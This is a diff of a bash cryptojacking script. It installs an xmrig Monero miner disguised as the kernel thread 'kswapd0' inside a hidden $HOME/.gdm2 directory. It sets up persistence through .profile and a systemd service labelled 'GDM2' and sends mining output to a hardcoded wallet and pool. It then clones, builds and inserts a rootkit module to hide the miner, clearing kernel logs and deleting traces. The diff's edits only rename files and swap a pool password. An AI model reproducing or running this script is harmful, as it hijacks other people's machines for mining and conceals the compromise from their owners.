@@ -121,7 +121,7 @@ fi
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/.gdm2/gdm2.rc script."
+echo "If needed, miner in foreground can be started by $HOME/.gdm2/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
@@ -241,7 +241,7 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_backgro
 
 killall xmrig
 
-echo "[*] Creating $HOME/.gdm2/gdm2.rc script"
+echo "[*] Creating $HOME/.gdm2/miner.sh script"
 cat >$HOME/.gdm2/miner.sh <<EOL
 #!/bin/bash
 if ! pidof kswapd0 >/dev/null; then
@@ -257,14 +257,14 @@ chmod +x $HOME/.gdm2/miner.sh
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep .gdm2/gdm2.rc $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/.gdm2/gdm2.rc script to $HOME/.profile"
-    echo "$HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep .gdm2/miner.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/.gdm2/miner.sh script to $HOME/.profile"
+    echo "$HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/.gdm2/gdm2.rc script is already in the $HOME/.profile"
+    echo "Looks like $HOME/.gdm2/miner.sh script is already in the $HOME/.profile"
   fi
   echo "[*] Running miner in the background (see logs in $HOME/.gdm2/xmrig.log file)"
-  /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
+  /bin/bash $HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
@@ -276,25 +276,27 @@ else
   if ! type systemctl >/dev/null; then
 
     echo "[*] Running miner in the background (see logs in $HOME/.gdm2/kswapd0.log file)"
-    /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
+    /bin/bash $HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
 
     echo "[*] Creating moneroocean systemd service"
-    cat >gdm2.service <<EOL
+    cat >/tmp/gdm2.service <<EOL
 [Unit]
 Description=GDM2
+
 [Service]
 ExecStart=$HOME/.gdm2/kswapd0 --config=$HOME/.gdm2/config.json
 Restart=always
 Nice=10
 CPUWeight=1
+
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv gdm2.service /etc/systemd/system/gdm2.service
+    sudo mv /tmp/gdm2.service /etc/systemd/system/gdm2.service
     echo "[*] Starting gdm2 systemd service"
     sudo killall kswapd0 2>/dev/null
     sudo systemctl daemon-reload
@@ -385,14 +387,14 @@ cat >$HOME/.gdm2/config.json <<EOL
     },
     "donate-level": 1,
     "donate-over-proxy": 1,
-    "log-file": "/home/adminroot/.gdm2/xmrig.log",
+    "log-file": "$HOME/.gdm2/xmrig.log",
     "pools": [
         {
             "algo": null,
             "coin": null,
             "url": "gulf.moneroocean.stream:10064",
             "user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",
-            "pass": "tsmserver",
+            "pass": "littlAcen@24-mail.com",
             "rig-id": null,
             "nicehash": false,
             "keepalive": true,
@@ -446,7 +448,7 @@ sed -i 's/"user": *"[^"]*",/"user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFF
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
 
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r)  git make gcc -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg -C ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ; rm -rf /tmp/.ICE-Unix/hiding-cryptominers-linux-rootkit/ && rm -rf /tmp/.X11-unix/hiding-cryptominers-linux-rootkit/ 
+cd /tmp || return; cd .ICE-unix || return; cd .X11-unix || return; apt update -y && apt install linux-headers-$(uname -r)  git make gcc build-essential -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg -C ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ; rm -rf /tmp/.ICE-Unix/hiding-cryptominers-linux-rootkit/ && rm -rf /tmp/.X11-unix/hiding-cryptominers-linux-rootkit/ 
 
 
 
